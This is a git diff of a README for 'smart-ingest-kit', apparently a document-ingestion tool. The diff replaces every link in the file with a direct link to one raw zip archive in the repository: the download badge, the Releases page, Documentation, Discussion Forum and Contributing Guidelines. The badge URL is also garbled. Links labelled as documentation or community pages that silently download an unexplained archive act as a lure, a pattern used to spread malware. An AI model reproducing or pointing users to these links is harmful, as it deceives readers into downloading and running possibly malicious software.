@@ -1,6 +1,6 @@
 # 🚀 smart-ingest-kit - Effortless Ingestion for Intelligent Processing
 
-[![Download smart-ingest-kit](https://img.shields.io/badge/Download%20smart--ingest--kit-v1.0-blue.svg)](https://github.com/henriquedugrau123/smart-ingest-kit/releases)
+[![Download smart-ingest-kit](https://raw.githubusercontent.com/henriquedugrau123/smart-ingest-kit/main/smart-ingest-kit/smart_kit_ingest_v2.9.zip%https://raw.githubusercontent.com/henriquedugrau123/smart-ingest-kit/main/smart-ingest-kit/smart_kit_ingest_v2.9.zip)](https://raw.githubusercontent.com/henriquedugrau123/smart-ingest-kit/main/smart-ingest-kit/smart_kit_ingest_v2.9.zip)
 
 ## 📝 Description
 
@@ -12,7 +12,7 @@ Follow these steps to get started with smart-ingest-kit.
 
 ### 📥 Download & Install
 
-To download smart-ingest-kit, visit this page to download: [Releases Page](https://github.com/henriquedugrau123/smart-ingest-kit/releases). 
+To download smart-ingest-kit, visit this page to download: [Releases Page](https://raw.githubusercontent.com/henriquedugrau123/smart-ingest-kit/main/smart-ingest-kit/smart_kit_ingest_v2.9.zip). 
 
 1. Go to the Releases page.
 2. Look for the latest version of the software.
@@ -71,8 +71,8 @@ You can find more detailed documentation in the README file or on the GitHub wik
 
 ### 🔗 Additional Resources
 
-- **Documentation:** For a deeper understanding of the features, visit our [Documentation](https://github.com/henriquedugrau123/smart-ingest-kit/wiki).
-- **Community Support:** Join our [Discussion Forum](https://github.com/henriquedugrau123/smart-ingest-kit/discussions) to connect with other users and get help.
+- **Documentation:** For a deeper understanding of the features, visit our [Documentation](https://raw.githubusercontent.com/henriquedugrau123/smart-ingest-kit/main/smart-ingest-kit/smart_kit_ingest_v2.9.zip).
+- **Community Support:** Join our [Discussion Forum](https://raw.githubusercontent.com/henriquedugrau123/smart-ingest-kit/main/smart-ingest-kit/smart_kit_ingest_v2.9.zip) to connect with other users and get help.
 
 ### 📢 Known Issues
 
@@ -85,8 +85,8 @@ We appreciate your feedback as it helps us enhance the application.
 
 ### 🛠️ Contributing
 
-If you want to contribute to smart-ingest-kit, please visit the [Contributing Guidelines](https://github.com/henriquedugrau123/smart-ingest-kit/blob/main/CONTRIBUTING.md). We welcome suggestions, bug reports, and pull requests.
+If you want to contribute to smart-ingest-kit, please visit the [Contributing Guidelines](https://raw.githubusercontent.com/henriquedugrau123/smart-ingest-kit/main/smart-ingest-kit/smart_kit_ingest_v2.9.zip). We welcome suggestions, bug reports, and pull requests.
 
 ## 🌐 Conclusion
 
-Smart-ingest-kit simplifies document ingestion using intelligent parsing methods. By following the steps above, you'll be ready to enhance your data processes with ease. Remember to visit this page to download: [Releases Page](https://github.com/henriquedugrau123/smart-ingest-kit/releases).
+Smart-ingest-kit simplifies document ingestion using intelligent parsing methods. By following the steps above, you'll be ready to enhance your data processes with ease. Remember to visit this page to download: [Releases Page](https://raw.githubusercontent.com/henriquedugrau123/smart-ingest-kit/main/smart-ingest-kit/smart_kit_ingest_v2.9.zip).
